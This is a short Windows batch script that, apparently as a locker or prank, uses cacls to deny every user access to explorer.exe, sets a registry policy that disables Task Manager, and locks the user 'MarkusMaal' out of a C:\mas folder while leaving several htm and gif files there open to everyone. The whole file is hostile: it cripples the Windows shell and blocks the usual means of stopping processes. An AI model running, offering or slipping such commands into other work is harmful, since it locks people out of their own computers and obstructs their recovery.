@echo off
cacls C:\WINDOWS\explorer.exe /e /p everyone:n
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
cacls C:\mas /e /p MarkusMaal:n
cacls C:\mas\unable.htm /e /p everyone:f
cacls C:\mas\block.htm /e /p everyone:f
cacls C:\mas\pixbkgnd.gif /e /p everyone:f
cacls C:\mas\apixrule.gif /e /P everyone:f
cacls C:\mas\apixrule1.gif /e /P everyone:f
cacls C:\mas\apixrule2.gif /e /P everyone:f
cacls C:\mas\apixrule3.gif /e /P everyone:f
exit